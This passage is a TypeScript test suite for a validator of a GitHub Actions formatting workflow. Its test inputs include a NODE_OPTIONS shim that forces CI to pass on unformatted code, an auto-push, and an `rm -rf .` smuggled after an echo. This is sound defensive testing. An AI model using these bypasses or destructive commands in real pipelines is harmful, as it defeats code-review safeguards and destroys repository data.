      mutate(
        mutate(WELL_FORMED, JOB_PERMISSIONS, '', 'the job permissions'),
        '\njobs:\n',
        '\npermissions: write-all\n\njobs:\n',
        'the jobs key',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('WRITE')
  })

  it("accepts a job's own `contents: read` under a workflow-level write (the job's block REPLACES it)", () => {
    const r = checkFormatWorkflow(
      atWorkflowLevel(WELL_FORMED, '  contents: write\n', JOB_PERMISSIONS),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it("rejects a job's own write under a workflow-level read", () => {
    const r = checkFormatWorkflow(
      atWorkflowLevel(
        WELL_FORMED,
        '  contents: read\n',
        '    permissions:\n      contents: write\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('WRITE')
    expect(r.message).not.toContain('workflow-level')
  })

  it('still rejects no `permissions:` at either level, naming both', () => {
    const r = checkFormatWorkflow(mutate(WELL_FORMED, JOB_PERMISSIONS, '', 'the job permissions'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('declares no `permissions:`')
    expect(r.message).toContain('workflow level')
  })

  it('stays green on the shipped workflow under each of the three spellings', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const quoted = mutate(shipped, CHECK_RUN, '        run: "pnpm format:check"\n')
    expect(checkFormatWorkflow(quoted).ok, checkFormatWorkflow(quoted).message).toBe(true)
    const crlf = shipped.replace(/\n/g, '\r\n')
    expect(checkFormatWorkflow(crlf).ok, checkFormatWorkflow(crlf).message).toBe(true)
    const inherited = atWorkflowLevel(shipped, '  contents: read\n', null)
    expect(checkFormatWorkflow(inherited).ok, checkFormatWorkflow(inherited).message).toBe(true)
  })
})

// Every key that decides WHAT or HOW the check runs was allow-listed on the checking
// STEP — and a job-level or workflow-level key reaches that step anyway, so the step
// rule was bypassable by RELOCATION, the same shape as the `working-directory:` /
// `defaults:` pair. `env:` is the measured case, end to end:
//   node prettier/bin/prettier.cjs --list-different bad.ts            → prints `bad.ts`, exit 1
//   NODE_OPTIONS=--require=$PWD/shim.js node … --list-different bad.ts → prints `bad.ts`, exit 0
// (`shim.js` is one line: `process.on('exit', () => { process.exitCode = 0 })`; prettier
// is the repo's own pinned 3.6.2.) And a job-level `env:` DOES reach a step that declares
// none of its own — GitHub probe run 33724282486 on PR #477 logged `D5-JOB-ENV=from-job-env`.
// So `pnpm format:check` still NAMES the offending file and the `format` context reports
// SUCCESS on unformatted code: the `with: ref: main` loss class (run 33635537234), spelled
// as a job key.
describe('the workflow and its jobs carry only allow-listed keys (#413)', () => {
  const JOB_HEADER = '  format:\n    runs-on: ubuntu-latest\n'

  const jobKeys: [string, string][] = [
    [
      '`env:` carrying NODE_OPTIONS',
      '  format:\n    env:\n      NODE_OPTIONS: --require ./scripts/shim.js\n    runs-on: ubuntu-latest\n',
    ],
    [
      '`container:`, third-party code as a job key',
      '  format:\n    container: node:20\n    runs-on: ubuntu-latest\n',
    ],
    [
      '`services:`',
      '  format:\n    services:\n      redis:\n        image: redis\n    runs-on: ubuntu-latest\n',
    ],
    ['`environment:`', '  format:\n    environment: production\n    runs-on: ubuntu-latest\n'],
    ['`outputs:`', '  format:\n    outputs:\n      files: x\n    runs-on: ubuntu-latest\n'],
    [
      '`concurrency:` on the job',
      '  format:\n    concurrency: format\n    runs-on: ubuntu-latest\n',
    ],
  ]

  for (const [label, header] of jobKeys) {
    it(`fails on a job declaring ${label}`, () => {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, JOB_HEADER, header, label))
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
      expect(r.message, label).toContain('a job may carry only')
    })
  }

  it('fires on the SHIPPED workflow when the job gains an `env:`', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    env:\n      NODE_OPTIONS: --require ./scripts/shim.js\n    runs-on: ubuntu-latest\n',
        'the shipped job header',
      ),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('`env`')
  })

  it('fails on a workflow-level `env:`, which every job and step inherits', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'jobs:\n',
        'env:\n  NODE_OPTIONS: --require ./scripts/shim.js\njobs:\n',
        'the jobs key',
      ),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('at workflow level')
    expect(r.message).toContain('`env`')
  })

  // GitHub itself refuses an unknown top-level key — probe run 33724281525 on PR #477
  // (`x-base:` beside `on:`/`jobs:`) produced a run with ZERO jobs, i.e. invalid workflow
  // file. The allow-list agrees with the producer rather than tolerating it.
  it('fails on an unknown top-level key, which GitHub rejects outright', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, 'jobs:\n', 'x-base:\n  runs-on: ubuntu-latest\njobs:\n', 'the jobs key'),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('at workflow level')
    expect(r.message).toContain('`x-base`')
  })

  // Over-reach: every key the workflow legitimately carries stays green, and the keys
  // owned by a rule of their own keep reporting THAT rule's message, not the generic one.
  it('accepts the keys the workflow and its job actually need', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  format:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n',
        '  format:\n    name: format\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: read\n',
        'the job header',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts a workflow-level `permissions:` and `name:`', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, 'jobs:\n', 'permissions:\n  contents: read\njobs:\n', 'the jobs key'),
    )
    expect(r.ok, r.message).toBe(true)
  })

  const ownedElsewhere: [string, string, string][] = [
    ['if', "  format:\n    if: github.event_name == 'push'\n    runs-on: ubuntu-latest\n", 'if:'],
    [
      'strategy',
      '  format:\n    strategy:\n      matrix:\n        node: [20]\n    runs-on: ubuntu-latest\n',
      'strategy',
    ],
    [
      'defaults',
      '  format:\n    defaults:\n      run:\n        working-directory: packages/dev-tools\n    runs-on: ubuntu-latest\n',
      'defaults',
    ],
  ]

  for (const [key, header, cause] of ownedElsewhere) {
    it(`reports \`${key}:\` through its own rule, not the key allow-list`, () => {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, JOB_HEADER, header, key))
      expect(r.ok, `${key}: ${r.message}`).toBe(false)
      expect(r.message, key).toContain(cause)
      expect(r.message, key).not.toContain('a job may carry only')
    })
  }
})

// The remedy's shell was the module's LAST deny-list (write-mode formatters, `${{`,
// `secrets.`), and it fell to the argument that retired the `uses:` and `with:` ones: a
// deny-list of formatters waves through the next formatter published. Measured on the
// shipped file before this rule: a remedy body of `echo "::error…pnpm format"` +
// `npx dprint fmt` + `git commit -am style && git push` → ok=TRUE. The remedy SAYS what
// to run; it does not run anything.
describe('a failure-path step only says what to run (#413)', () => {
  const REMEDY = `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`
  const remedyBody = (body: string) =>
    mutate(WELL_FORMED, REMEDY, `        run: |\n${body}`, 'the remedy step')
  const KEEP = `          echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`

  const banned: [string, string][] = [
    ['a formatter no offender list names', '          npx dprint fmt\n'],
    ['an auto-commit', '          git commit -am style && git push\n'],
    ['a checkout rewrite', '          git checkout origin/main -- .\n'],
    ['a command substitution inside the message', '          echo "$(prettier --write .)"\n'],
    ['a backtick substitution', '          echo "`prettier --write .`"\n'],
    ['an unquoted echo argument', '          echo pnpm format && rm -rf .\n'],
  ]

  for (const [label, extra] of banned) {
    it(`fails on a remedy that also runs ${label}`, () => {
      const r = checkFormatWorkflow(remedyBody(`${KEEP}${extra}`))
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
    })
  }

  it('names the remedy allow-list as the cause of the dprint row', () => {
    const r = checkFormatWorkflow(remedyBody(`${KEEP}          npx dprint fmt\n`))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('REMEDY_COMMAND_LINES')
  })

  it('fires on the SHIPPED workflow when the remedy gains a formatter', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    const r = checkFormatWorkflow(
      mutate(
        shipped,
        '          echo "::error title=Formatting check failed::The files listed in the previous step are not formatted. Run \'pnpm format\' locally, commit the result, and push again. CI never rewrites your branch."\n',
        '          echo "::error title=Formatting check failed::The files listed in the previous step are not formatted. Run \'pnpm format\' locally, commit the result, and push again. CI never rewrites your branch."\n          npx dprint fmt\n',
        'the shipped remedy body',
      ),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('REMEDY_COMMAND_LINES')
  })

  const accepted: [string, string][] = [
    ['a single-quoted echo', `          echo '::error::Not formatted. Run pnpm format locally.'\n`],
    ['two quoted echoes', `${KEEP}          echo "See the step above for the file list."\n`],
    [
      'an echo with a flag',
      `          echo -e "::error::Not formatted. Run 'pnpm format' locally."\n`,
    ],
    ['a printf', `          printf '%s\\n' "::error::Not formatted. Run 'pnpm format' locally."\n`],
  ]

  for (const [label, body] of accepted) {
    it(`accepts a remedy that is ${label}`, () => {
      const r = checkFormatWorkflow(remedyBody(body))
      expect(r.ok, `${label}: ${r.message}`).toBe(true)
    })
  }

  it('accepts the shipped remedy, which is one quoted echo', () => {
    const shipped = readFileSync(FORMAT_WORKFLOW, 'utf-8')
    expect(checkFormatWorkflow(shipped).ok).toBe(true)
  })

  // The remedy still has to NAME the remedy — the allow-list narrows the shell, it does
  // not replace AC1's content rule.
  it('still fails when the allow-listed echo says nothing about `pnpm format`', () => {
    const r = checkFormatWorkflow(remedyBody('          echo "::error::Something went wrong."\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('names the remedy')
  })
})
